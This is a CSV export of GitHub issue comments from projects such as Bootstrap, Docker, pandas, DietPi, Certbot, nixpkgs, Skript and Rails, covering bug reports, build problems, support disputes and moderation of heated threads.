bootstrap/twbs/3057/6510437,"In the end the guy who considers himself a hypster engineer wrapped the stuff into if statemanet clearMenus()   if (!isActive) $parent.toggleClass('open')  Furthermore he twitted that ""The only reason I [fat] don't use semicolons is to troll people."" There we are.  --  Let the artists troll people and profs go on with the real progress ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/6755307,"I guess this is lost amongst the noise, but I think it's best to listen to Brendan Eich discussing this thread and Automatic Semicolon Insertion (ASI) The point is that semi colons are actually required, it's just that your error in excluding them can be automatically corrected (in most cases).  So it seems clear to me that it's better to write correct code, in the format as it will be when actually run, rather than rely on automatic error correction. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/6762825,It's important to remember that this struggle may lead to the end of all life as we know it. CHOOSE NOW WHERE YOU STAND. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/6794118,"@friend SO TRUE! I don't understand why anyone would WANT to depend on ""error correction"" to ""fix"" their code for them. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/6797463,"Ok, how do I unsubscribe from this? ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/6797473,"Just reply with ""unsubscribe"" in all caps ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/6797474,"@friend Look at the bottom of this page, below the ""Comment on this issue"" button ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/7037450,I'm appreciating this debate as I read Maintainable Javascript by Nicholas C. Zakas. Style guides FTW. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/8403922,@friend epic win on an already hilarious thread D ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/10114018,"I think this is all about @friend trying to be hipster. You know... step over all style guides currently available at the moment. YAY! Personally, I like, and I think the only correct answer is the first @friend comment. There's nothing else to add. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/10674029,"For the record, this was worth a talk ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/11097579,Just want to be part of web history. Haha... Hilarious. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/11279279,"""For verily I say unto you, Till heaven and earth pass, one jot or one tittle shall in no wise pass from the law, till all be fulfilled."" -Matthew 518 ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/11279982,You should always use semicolons with curly-brace languages. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/13474066,        You don't have to put periods at the end.                                 At the end of sentences.  But it can make them easier to read.   On the other hand      there's no real reason not to         just do whichever you want  ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/17867291,"Well, I just want to be part of this; ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/17884097,"Yes, it certainly has become legendary; On Tue, May 14, 2013 at 408 AM, Enrique notifications@friend.com wrote ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/18446815,Relevant We use semicolons everyday ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/20083328,"""The only true law is that which leads to freedom"" (R.Bach) Any style question starting with ""why don't you..."" has an easy answer ""because this is my style"". If you like semis, you use them; if you don't, you don't use them. What can be easier? ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/20092757,"Vlad, That would be perfectly true if this was just a style issue. And I'd be 100% behind you if that was the case. Unfortunately this is about much more than styling. JavaScript needs the semicolons to function logically. On 27 Jun 2013 0602, ""Vlad Patryshev"" notifications@friend.com wrote ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/20235530,"There might be something else we want to focus on, leave the semicolons alone.  ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/21432064,"Please use semicolons. Readbility is important. Maybe, you, @friend, know how and when using semicolon but it's not the case for all. Rookies, kiddies and even experts could need semicolon to read the code. So, please, add it for readability... ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/35862155,"Why don't we just get rid of indentations too??? It's really . And, also . All the current IDE's are doing it wrong. Either they should give diff background colors to the different scopes or show them . ",False,True,False,bootstrap/twbs/3057
moby/moby/20303/133481954,"I just hit almost the same issue as #14363 (mine reads ""ApplyLayer exit status 1 stdout stderr chmod /bin/mount permission denied"") , also under Gentoo. It is related to the use of the kernels built with  such as Gentoo's  package. After some digging, I changed the following This appears to fix the problem, but hits another problem more like that shown in #14363, ""ApplyLayer exit status 1 stdout stderr operation not permitted"". So I tried adding the following from #14363, just to test if it works. (Note that disabling this option appears to be a very bad idea from a security standpoint!) The result was that it worked. To save anyone the hassle in future, Docker could check for the existence of  and  and, if present, ensure the values of both are 0. ",False,True,False,moby/moby/20303
pandas/pandas-dev/6011/25931545,"Using the latest Pandas ""pandas (0.13.0-246-g1e1907c)"", one critical bug is still existed. For instance, if tuples has some results from SQL and is converted to Dataframe, the first row of the tuples is added ""twice"" times into Dataframe as below. qr = &lt;tuples from SQL Select result&gt;  # number of records  100 df = pd.DataFrame.from_records(qr)    # number of records  101 In the log, you can find the first and second row have been duplicated. redacted As a result, diggling down the source code ""frame.py"", some parts caused this issue. Based on the latest version ""frame.py"", the line number is around 756. Whatever happened, the list ""values"" has [first_row] around 756 line, and then the whole ""data"" is added into ""value"" list again around 760 ~ 769 line. It make the first and second row duplicated. Could you please fix this issue and then update the master branch as well ? 751             dtype = None  752             if hasattr(first_row, 'dtype') and first_row.dtype.names  753                 print(""hasattr dtype"")  754                 dtype = first_row.dtype  755   756             #values = [first_row]   ## caused the duplicated first and second row  757             values = []    ## should be fixed   758   759             # if unknown length iterable (generator)  760             if nrows is None  761                 # consume whole generator  762                 values += list(data)  763             else  764                 #i = 1  ## caused the duplicated first and second row                        i = 0 ## should be fixed  765                 for row in data  766                     values.append(row)  767                     i += 1  768                     if i &gt;= nrows  769                         break  ",False,True,False,pandas/pandas-dev/6011
fisher/jorgebucaran/307/158263996,"fisherman v3 Goals for the next major release  Require fish 2.3? Self-update by default after 3. Upgrading to fisherman 3 should not break anyone's system.  &lt;blockquote&gt; 2.3 should include a temporary 2.2 shim or ask the user to upgrade to 2.3?&lt;/quote&gt; Internally, fisherman 3 should use a cache/config directory layout similar to fin to prevent name collisions. ~/.config/fisher/USER/REPO (instead of ~/.config/fish/REPO) Notice  instead of . Using the same name is impossible due to fisherman's current directory layout incompatible with the proposed alternative.   Use a simpler single number release version scheme, similar to fin's 1, 2, etc. Emulate fin's fishfile handling Auto-formatting. For example, enforce   style, auto-sort, whitespace trim, comment sorting, etc. The fishfile should be a mirror of the config. For example, removing items and running  should remove installed items. The opposite is already true in current fisherman. #292 The fishfile should not list dependencies installed by other plugins.    Be silent by default please (maybe only show the spinner?). Installing should always try to fetch a new copy of the plugin even if one already exists in the cache. The purpose of the cache should be similar to fin's, i.e, use as a fallback if there is no network. is useless. If the fishfile is a mirror of your config, you don't need and list command. Drop dep ref counting. Instead, update the config from scratch every time a new item is installed or removed.  Create hardlinks of a plugin's exported functions/completions inside $fish_path, instead of soft links (also like fin). See #305. Do not automatically call set_color_custom (fisherman extension used by some themes).  ",False,True,False,fisher/jorgebucaran/307
moby/moby/4717/29568300,"When launching a dockerised  process as root it is possible to execute some kind of init script to set sysctl values. But setting right ulimits is actually need  the -privileged flag. When run as user (-u flag) is there a way to do subj? I did not find any in docs. Setting of any other stuff (like /dev/shm size,  would be great. ",False,True,False,moby/moby/4717
moby/moby/4717/338902692,"hi, i run inside a privileged container and do some setting with systctl Some proc file missed, i do not know how to fix. here is my env ",False,True,False,moby/moby/4717
moby/moby/4717/338914203,"@friend this issue is a feature request, and the feature was implemented last year. If you have a bug to report, please open a new issue with the information that's requested in the issue template that's shown when you open the issue. Make sure your system is fully up-to-date as CentOS uses a rolling update model (i.e. CentOS 7.3 reached end of life after 7.4 was released). I'm locking this issue for comments to prevent it from collecting unrelated issues (which easily go overlooked on closed issues); if you arrive here because you want to report a bug; open a new issue instead, thanks! ",False,True,False,moby/moby/4717
DietPi/Fourdee/1956/343532123,"Creating an image request Give us some formal device information  Device name | Helios4 Official product URL |  resource URL (if available) |  and  download URL |  the SBC officially supported by the Debian installer?  No. But note that upstream support for Kernel and U-Boot mainline is almost completed. Linux Kernel Mainline support  80% upstream (ongoing effort soon to be 100%) U-Boot Mainline support  100% upstream  If not, is a reliable 3rd party Debian image available for this SBC?  Official supported by Armbian with hardware 100% supported  If not, are there install instructions for Debian available? ",False,True,False,DietPi/Fourdee/1956
DietPi/Fourdee/1956/407064925,"@friend  Thanks for your request. Sadly do not offer images, which are based on ARMbian due to constant friction we had (and by times still have) with their devs. To solve/avoid this, the only solution was to completely remove any need for ARMbian from DietPi. But as this is open source, you are allowed to create your own image, by running our DietPi image creation script on the fresh ARMbian image  should work on all not too much outdated Debian based images, however we cannot guarantee it in every case of manual system manipulations or special firmware needs. As soon as it's possible to use the official Debian installer on it or having another non ARMbian reliant image source, we will have another look. ",False,True,False,DietPi/Fourdee/1956
DietPi/Fourdee/1956/412407580,@friend Can you elaborate on the aspects of the Armbian builds that don't fit to make it a baseline for DietPi ? This could help. Because the following statement when we are talking about Arm SBC is not really helping / encouraging. ,False,True,False,DietPi/Fourdee/1956
DietPi/Fourdee/1956/414143749,"@friend The issue is not the ARMbian build of the image. The issue is with ARMbian themselves in relation to us. We simply cannot work together for a better cause. We've tried, been trolled, had arguments. In a hope to put an end to this, I removed all their images from our lineup. To reduce friction and pointless childish trolling, we no longer provide their images, or, have anything to do with them. We are different projects, different end goals and therefore very different approaches in all aspects. In regards to how we create DietPi images We rely on an existing pre-image with working uboot/kernel and modules. If the RootFS is not already Debian, we replace it with our own. As their is no current non-ARMbian based images available for this device, and, we do not compile images from scratch (its not what we do, and, would eat up 99% of our time). I will mark it as closed. ",False,True,False,DietPi/Fourdee/1956
DietPi/Fourdee/1912/403342675,License pre-reqs ,False,True,False,DietPi/Fourdee/1912
DietPi/Fourdee/1912/403342995, 🈴 TM check | no results in UK TM database   ,False,True,False,DietPi/Fourdee/1912
DietPi/Fourdee/1912/403343205, 🈴 Include copyright | Expired in 2005 ,False,True,False,DietPi/Fourdee/1912
DietPi/Fourdee/1912/403347436,Which contains ,False,True,False,DietPi/Fourdee/1912
DietPi/Fourdee/1912/405104828,More important things to do than troll a troll. ,False,True,False,DietPi/Fourdee/1912
certbot/certbot/5433/288948121," operating system is (include version) CentOS 6 I installed Certbot with (certbot-auto, OS package manager, pip, etc) Downloaded from website manually I ran this command and it produced this output IMPORTANT NOTES  The following errors were reported by the server Domain php72webehostin.com Type   unknownHost Detail No valid IP addresses found for php72.webehostin.com ♠   Certbot's behavior differed from what I expected because DNS resolves for me on EVERY machine... problem with Let's Encrypt DNS? ",False,True,False,certbot/certbot/5433
certbot/certbot/5433/358394908,@friend any ideas? ,False,True,False,certbot/certbot/5433
certbot/certbot/5433/358395842,"@friend You have issues with your authoritative DNS servers. unboundtest confirms as much This isn't a problem the Certbot team can solve so I'm going to close this issue. I recommend you change DNS providers and see if the problem persists, or otherwise try to return to the community forum to solicit help debugging your authoritative DNS server's problems. ",False,True,False,certbot/certbot/5433
certbot/certbot/5433/358432565,Or your DNS system is busted.  Works just fine for everyone else on the planet. ,False,True,False,certbot/certbot/5433
certbot/certbot/5433/358435131," like your software should be processing the ""truncated message"" regardless.  The rest of DNS appears to work this way... there is nothing WRONG with this setup.  Nothing out there says it's wrong officially anyways... Sigh. ",False,True,False,certbot/certbot/5433
certbot/certbot/5433/358435371,"This does not discount an issue with your authoritative DNS servers. We make unboundtest.com available specifically because it emulates the same recursive resolver settings Let's Encrypt uses in production (0x20 case randomization, fully validating DNSSEC, etc). Again, this does not discount an issue with your authoritative DNS servers. Performing a ping to do an A lookup with your local recursive resolver is not equivalent to the DNS lookups being done by Let's Encrypt. ",False,True,False,certbot/certbot/5433
certbot/certbot/5433/358436255,Why are you performing such a large lookup and why?  You should only be using an A record lookup. Also How am I supposed to troubleshoot an error your system generates when the output message doesn't tell me ANYTHING as to what is possibly wrong? ,False,True,False,certbot/certbot/5433
certbot/certbot/5433/358436840,"This is an error from Unbound, not our own software. The configuration to set up your own instance of Unbound to troubleshoot is there. I also recommended that you move to the community forum if you need help understanding the problems. I'm going to lock this issue now. As previously mentioned this isn't anything the Certbot team can help with, the problem exists in an entirely separate layer of technology than the ACME client you're using. ",False,True,False,certbot/certbot/5433
nixpkgs/NixOS/32080/276843392,"In principle it should be possible to build Bazel from source on macOS. Bazel itself is quite a mess to patch, since  is sometimes invoked from the PATH, sometimes absolutely from , and sometimes via an  script. What has me stumped is that Bazel grabs a bunch of dependencies whose build systems also rely on , particularly protobuf and grpc. Many of the calls don't straightforwardly do something like , but instead query various SDK locations and feed them into further wrapper scripts. Unfortunately the only success I've had has been allowing these build systems access to . For my use case an impure-but-working Bazel derivation on Darwin is better than no working Bazel derivation on Darwin, especially considering that the impurity is confined to Xcode's CLT and libraries. From what I understand there are two reasonable paths forward.  Accept this impurity on Darwin, but do so in a principled way. Surely there's some existing idiomatic way of doing this. I've seen mention of a ""pure Darwin stdenv"" and an ""impure Darwin stdenv"" in discussions elsewhere, but I can't seem to find any documentation on these.  Build some heavyweight hacks into the Bazel build system. This might be something like inserting extra machinery to patch the external dependencies that Bazel grabs, or perhaps writing a fake  command. I think this would involve a lot of work for questionable benefit; because of Xcode it seems that larger degree of impurity tends to be acceptable when it comes to Darwin in Nixpkgs at large.   @friend and @friend, I'm curious about your thoughts. ",False,True,False,nixpkgs/NixOS/32080
nixpkgs/NixOS/32080/347327856,"I am not happy with heavy divergence of NixOS configurations. If upstream cannot make a system that works based on standards, then I am not interested in using it, let alone increasing the size of the NixOS repository with workarounds. Why do you want to use it? Is Bazel so unique that you cannot do without? There is an issue over 1.5 years old to remove /bin/bash references. It appears that portability has no priority for them. They do seem to accept shell script improvements, so there is hope. ",False,True,False,nixpkgs/NixOS/32080
nixpkgs/NixOS/32080/347332672,"Regrettably, I'm tied to Bazel because of TensorFlow. Furthermore, I'm calling TF from C++ (already a use case poorly supported upstream), for which none of upstream's binary distributions are suitable given my hardware, so I must build TF from source. It's only due to Nix that deploying this monstrosity works at all. A while ago there were a few community supported alternative build systems for TF, but they've all diverged too much for my use case. A working Bazel derivation on macOS would allow my colleagues to build our application and run tests locally without a virtual machine. It is indeed a shame that the ""state of the art"" in machine learning is in such a pitiful state. ",False,True,False,nixpkgs/NixOS/32080
nixpkgs/NixOS/32080/347345815,"OK, those are reasonable reasons. It turns out you don't actually need to know anything about computing to make a machine learning library. If you already made a cost calculation compared to the alternatives, I'd suggest you become good buddies with the Bazel maintainers and patch it to the point that it somewhat acceptable. Their third_party directory being present is also not what you typically want to see. One way to achieve this is to send in a few PRs to them and then send a message to their mailing list to get someone on board for getting your patches in with priority over others. Have you seen ",False,True,False,nixpkgs/NixOS/32080
nixpkgs/NixOS/32080/349827464,"For what it is worth, williammpratt's attitude here is not representative of the NixOS community's attitude toward other software. The user has since been blocked from the NixOS organization. ",False,True,False,nixpkgs/NixOS/32080
nixpkgs/NixOS/32080/355016555,Probably a duplicate of #30590 ,False,True,False,nixpkgs/NixOS/32080
nixpkgs/NixOS/32080/375917406,Closing this issue in favor of #30590. ,False,True,False,nixpkgs/NixOS/32080
WarBugs/WarEmu/13182/401558318,Expected behavior and actual behavior No option to leave group - stupid crown over my head no option to disband or leave. Steps to reproduce the problem Screenshots/Videos or archive.org evidences  ,False,True,False,WarBugs/WarEmu/13182
WarBugs/WarEmu/13182/456299653,So is it only the crown that disturbs? Can you join other groups or warbands? ,False,True,False,WarBugs/WarEmu/13182
WarBugs/WarEmu/13182/456443685,Could not join other groups or Warbands. I just mentioned the crown as a visual indicator that I was still classed as being in a group. ,False,True,False,WarBugs/WarEmu/13182
WarBugs/WarEmu/13182/456564568,Hm strange - thanks for the feedback. ,False,True,False,WarBugs/WarEmu/13182
WarBugs/WarEmu/13182/456614578,Does this mean I get one of those bug report tokens for the griffon mount in Altdorf? ,False,True,False,WarBugs/WarEmu/13182
WarBugs/WarEmu/13182/456688522,,False,True,False,WarBugs/WarEmu/13182
WarBugs/WarEmu/13182/456846002,"We can not accept this kind of behavior. There are rules that you can find on forum. The answer of Sioding was not aggressive, while yours is. NEVER do it again. ",False,True,False,WarBugs/WarEmu/13182
WarBugs/WarEmu/13182/456862280,I lock the conversation at this point. TBH It was just a quote from here ,False,True,False,WarBugs/WarEmu/13182
Skript/SkriptLang/1568/364952194,"hi each time i add this piece of code 28.09 172442 [Server] INFO titustitus98 issued server command /sk reload drakeconomy 28.09 172442 [Server] ERROR #!#!  28.09 172442 [Server] ERROR #!#! [Skript] Severe Error 28.09 172442 [Server] ERROR #!#! Could not load drakeconomy.sk 28.09 172442 [Server] ERROR #!#!  28.09 172442 [Server] ERROR #!#! If you're developing an add-on for Skript this likely means that you have done something wrong. 28.09 172442 [Server] ERROR #!#! If you're a server admin however please go to  172442 [Server] ERROR #!#! and check whether this error has already been reported. 28.09 172442 [Server] ERROR #!#! If not please create a new ticket with a meaningful title, copy &amp; paste this whole error into it (or use paste service), 28.09 172442 [Server] ERROR #!#! and describe what you did before it happened and/or what you think caused the error. 28.09 172442 [Server] ERROR #!#! If you think that it's a trigger that's causing the error please post the trigger as well. 28.09 172442 [Server] ERROR #!#! By following this guide fixing the error should be easy and done fast. 28.09 172442 [Server] ERROR #!#!  28.09 172442 [Server] ERROR #!#! Stack trace 28.09 172442 [Server] ERROR #!#! ch.njol.skript.SkriptAPIException Signature of function is null when return type is asked! 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.lang.function.FunctionReference.getReturnType(FunctionReference.java201) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.lang.function.ExprFunctionCall.getReturnType(ExprFunctionCall.java56) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.effects.EffChange.init(EffChange.java208) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.lang.SkriptParser.parse(SkriptParser.java249) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.lang.SkriptParser.parse(SkriptParser.java176) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.lang.Statement.parse(Statement.java61) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.ScriptLoader.loadItems(ScriptLoader.java754) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.command.Commands.loadCommand(Commands.java467) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.ScriptLoader.loadScript(ScriptLoader.java472) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.ScriptLoader.loadScripts(ScriptLoader.java271) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.SkriptCommand.onCommand(SkriptCommand.java167) 28.09 172442 [Server] ERROR #!#!     at org.bukkit.command.PluginCommand.execute(PluginCommand.java44) 28.09 172442 [Server] ERROR #!#!     at org.bukkit.command.SimpleCommandMap.dispatch(SimpleCommandMap.java141) 28.09 172442 [Server] ERROR #!#!     at org.bukkit.craftbukkit.v1_8_R3.CraftServer.dispatchCommand(CraftServer.java641) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.PlayerConnection.handleCommand(PlayerConnection.java1162) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.PlayerConnection.a(PlayerConnection.java997) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.PacketPlayInChat.a(PacketPlayInChat.java45) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.PacketPlayInChat.a(PacketPlayInChat.java1) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.PlayerConnectionUtils$1.run(SourceFile13) 28.09 172442 [Server] ERROR #!#!     at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java511) 28.09 172442 [Server] ERROR #!#!     at java.util.concurrent.FutureTask.run(FutureTask.java266) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.SystemUtils.a(SourceFile44) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.MinecraftServer.B(MinecraftServer.java715) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.DedicatedServer.B(DedicatedServer.java374) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.MinecraftServer.A(MinecraftServer.java654) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.MinecraftServer.run(MinecraftServer.java557) 28.09 172442 [Server] ERROR #!#!     at java.lang.Thread.run(Thread.java748) 28.09 172442 [Server] ERROR #!#!  28.09 172442 [Server] ERROR #!#! Version Information 28.09 172442 [Server] ERROR #!#!   Skript 2.2-dev25 28.09 172442 [Server] ERROR #!#!   Bukkit 1.8.8-R0.1-SNAPSHOT 28.09 172442 [Server] ERROR #!#!   Minecraft 1.8.8 28.09 172442 [Server] ERROR #!#!   Java 1.8.0_171 (Java HotSpot(TM) 64-Bit Server VM 25.171-b11) 28.09 172442 [Server] ERROR #!#!   OS Linux amd64 2.6.32-042stab127.2 28.09 172442 [Server] ERROR #!#! ` ",False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425498881,"Use hastebin or pastebin for errors, because it's pretty hard to read right now. Also, why set the args as , when you can just make a command without args using♠command /die` Stack trace (roughly) for solving the issue ",False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425499316,"The error indicates ""Bukkit 1.8.8-R0.1-SNAPSHOT 28.09 "" This fork of Skript does not support anything lower than 1.9 ",False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425534380," As others have said, we don't support versions of Minecraft older than 1.9. You're also using an old version of Skript. You must be using the newest version of Skript to report issues (how else do we know if your issue is already fixed or not?) Your bug is due to the function your calling not being loaded yet. Make sure your  function is in a script that is loaded before the  script.  ",False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425569223,but my other leaderboard works fine ,False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425569487,"what does that have to add anything? this is super vague What code are you using for that 'other leaderboard', what version, etc. ",False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425617408,i use the exact same code with the exact same version ,False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425619135,and on the exact same server ,False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425702576,so what can i do? ,False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425706161,Update Skript and hope that it works on 1.8. This is a known bug in old releases. ,False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425709572,hi so i have updated to the latest recommended version of skript for 1.8 but bug perssists and here is my full log ,False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425709620,Use the bigger code blocks or hastebin or pastebin for errorrrs bcause this is hard to read ,False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425709661,"We do not officially support anything lower than 1.9, so you're on your own. ",False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425709747,besides since most servers still use 1.8 you should support 1.8 ,False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425709813,Actually most servers use 1.12.2 ,False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425709832,"No, most servers support 1.12 or 1.13 and 1.8 should be left alone. You have plugins that enable 1.8 combat in 1.12 so why even bother using 1.8 ",False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425709987,idc about 1.9 compat mechanic and i simply can't just upgrade my server to a higher version just like that because some things might break and it took me months to set that server up ,False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425710081,"^ that there's no such thing as ""the latest recommended version of skript for 1.8"", just use the normal latest stable one, being dev37c, and report any bugs you have. We don't really support 1.8 but we try to keep it working (sometimes meaning that we just disable things that don't work on it) ",False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425710214,there is just go on the official skunity discord and  type in .download and it will show you it ,False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425710224,"you can't really expect us to spend the time on fixing the support for an old, long unsupported version (by Spigot too), just because ""some things might break"" (meaning you didn't even try) and you can't find the time to test stuff yourself. ",False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425710290,"♠Note that these resources are not maintained by me. If you notice something wrong with them, do not contact me.` - from the repo readme It's not as simple as just adding a line of code that says ""support 1.8 magically"". You're free to make a pull request adding support for 1.8, however if you're not willing to do this please do not just demand that. 1.8 is literally over 1000 days old and full of bugs. ",False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425710301,"well don't trust a bot on skUnity to be the 100% up-to-date official source of Skript news lol And about your error, do you have Umbaska on your server? ",False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425710660,i have updated my server to 1.12.2 but now everytime i join it kicks me and generates an Internal Exeption ,False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425710698,thank you for breaking my server ,False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425710743,thank you for not providing the stack trace ,False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425710773,then maybe you're using 1.8 plugins that dont work on 1.12 that do something with joining. idk ,False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425710813,that is why i didn't want to update to 1.12 ,False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425710866,so get the 1.12 versions of those plugins ,False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425711806,and i still can't join ,False,True,False,Skript/SkriptLang/1568
Skript/SkriptLang/1568/425711966,"This is the Skript issue tracker, for tracking issues happening in the supported versions of Minecraft. If you figure something out to make your server work on a supported version and the issue will still occur, please open a separate issue and post a gist.github.com link to the stacktrace along with the Spigot version, Skript version and a list of plugins, addons especially. If you need support with upgrading your server please ask in a more proper place like on the Spigot forums. And about your issue with Skript, I'm 95% sure it's caused by some outdated addon, please try without Umbaska to begin with, and if that doesn't help, ask on skUnity or on Skript Chat. Locking this not to hurt people's eyes more ",False,True,False,Skript/SkriptLang/1568
rust/rust-lang/7803/16774829,"I'm surprised that I was unable to find an open issue for this. Read  for the basic idea. From what I understand the general attitude is favorable, but people have yet to decide whether to salvage the  sigil or to require  to now be written . Let's try to defer these syntax decisions and just get GC-in-a-library working as soon as possible, if people agree that it is desirable. Nominating for 0.8. Aggressive, but I feel like we're going to suffer if we try to put this off for too long. ",False,True,False,rust/rust-lang/7803
rails/rails/1917/1144319,"It seems that at some point in time the code of the request forgery protection was modified in such a way, that the InvalidAuthenticityToken exception is not thrown anymore. This change was made in a very sloppy way, take a look at  exception class is still there, but the exception is not being thrown anymore, instead the handle_unverified_request method is being called, which by default just quietly resets the session (!?). This is a pain to debug if you happen to have a problem with token somewhere in the application, you just get logged out of the sudden without any apparent reason. What's worse is that the handle_unverified_request method is not at all documented and in fact the documentation still talks about throwing an exception ",False,True,False,rails/rails/1917
rails/rails/1917/1475280,"From 3.1, Rails shows a warning in the logs when the session is reset. You are right about the api doc being outdated. You can change it in  if you wish. Or I'm sure someone will take it up and fix ) ",False,True,False,rails/rails/1917
rails/rails/1917/1475281,"This is because of a security issue - read this for more information. Yes, the method could be documented better - you can contribute some via the docrails project if you'd like to. The docrails repository is a public access repo where anyone can submit documentation patches. ",False,True,False,rails/rails/1917
rails/rails/1917/1475302,Why are you closing this issue? This is a serious problem and it was not fixed. Since when is it OK for Rails to have docs that are misleading and completely out of date? ,False,True,False,rails/rails/1917
rails/rails/1917/1475825,Few more links  think that this request should be reopened if the doc is misleading. ,False,True,False,rails/rails/1917
rails/rails/1917/1476959,I've made the change in docrails ,False,True,False,rails/rails/1917
rails/rails/1917/1477295,"vijaydev Thanks! I think this change was made in a rather mindless way and it should also be fixed in the code. The InvalidAuthenticityToken class is still present in request_forgery_protection.rb, which makes controllers using old invalid token handling code like this work without a glitch, even through the exception is not thrown any more and this code simply stops working when upgrading to a Rails version which introduced this change (A minor revision breaks compatibility and it's not even mentioned neither in the release notes nor in the documentation!). Either the handle_unverified_request method should be removed and the exception should be thrown again (after resetting the session?), or the exception class should be removed from the code and from the tests. In fact the commit that introduced this patched the test controllers to throw the exception as it was in the past, but it seems not enough thought was given to everybody else applications and tests  the cause of my application randomly logging people out costed me a few days of work and it seems to me a part of a larger issue of a very careless attitude towards maintaining compatibility and not breaking existing functionality with the introduction of the newest kool-aid. Until recently I seldom had to dig into Rails code to find a problem occurring with my application, but when migrating to Rails 3.0 I find problem after problem of this kind, previously I have spent a week trying to spot a performance regression, which turned out to be caused by changes in PostgreSQLAdapter and made the application in concern work three to four times slower. Perhaps changes should be made and accepted with greater care... ",False,True,False,rails/rails/1917
rails/rails/1917/1477448,"@friend thanks for that - any chance you can document the handle_unverified_request method? @friend I closed it because I knew that someone like @friend would fix it and if I left it open then before too long we'll be back to where we were with the LH tracker and we'd have HN articles screaming ""OMG! Rails has a thousand bugs"". As for the hyperbole in your reply - no it's not a serious problem, it's not the first time that docs have been incorrect (it won't be the last either) and I think ‘completely’ out of date is a little bit of exaggeration don't you think. I'm sorry you lost some time due to this but this kind of thing happens to all of us. ",False,True,False,rails/rails/1917
rails/rails/1917/1477550,"You knew that someone would fix it and that's why you have closed it? I thought it works a bit differently, first someone fixes it, then you close the issue ^^ I think it is a serious problem if people are loosing days of work because of it, and if you look at the links posted above by paneq I'm not the only one affected by this. I also pointed out a specific, technical defect with the changes that were made which you have chosen to completely ignore. ",False,True,False,rails/rails/1917
rails/rails/1917/1477569,"@friend I understand the frustration. I myself had suffered silent session resets and spent time on debugging. But let's not get carried away. Calling people's hard work mindless is not going to help anyone. And if I remember right, 3.0.4 was released primarily as a security fix release and this change was well advertised (on Google groups, rails blog etc). As for the code changes you mention, @friend or @friend might have a better understanding and they can take this discussion forward. ",False,True,False,rails/rails/1917
